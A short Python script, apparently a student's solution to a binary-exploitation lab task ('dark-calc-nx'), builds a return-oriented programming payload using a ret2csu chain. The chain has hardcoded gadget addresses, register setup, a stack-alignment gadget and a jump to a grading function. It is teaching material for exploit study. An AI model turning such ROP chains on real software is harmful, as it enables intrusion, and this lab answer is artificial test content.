#!/usr/bin/env python3
"""Task 3: build the payload for attack/dark-calc-nx.

TODO: replace the empty payload with the bytes required by the lab.
"""
import sys
import struct

def p64(x):
    return struct.pack('<Q', x)

# 1. 地址
grade_eval_addr = 0x401978 
csu_pop = 0x401a2a       # 直接跳到这里，执行 pop rbx
csu_call = 0x401a10      
bss_addr = 0x602090      
ret_gadget = 0x4018c7    # 栈对齐用

# 2. 构造 Payload
payload = p64(grade_eval_addr)
payload += b'A' * 16
payload += p64(csu_pop)

# 3. 填充 CSU 需要的寄存器（注意：不要 B*8 了！）
payload += p64(0)        # rbx = 0
payload += p64(1)        # rbp = 1
payload += p64(bss_addr) # r12 = 0x602090
payload += p64(4)        # r13 = 4
payload += p64(0)        # r14 = 0
payload += p64(0)        # r15 = 0

# 4. 栈对齐补丁（必须加在这！）
payload += p64(ret_gadget) 

# 5. 跳到 CSU 调用入口
payload += p64(csu_call)

sys.stdout.buffer.write(payload)
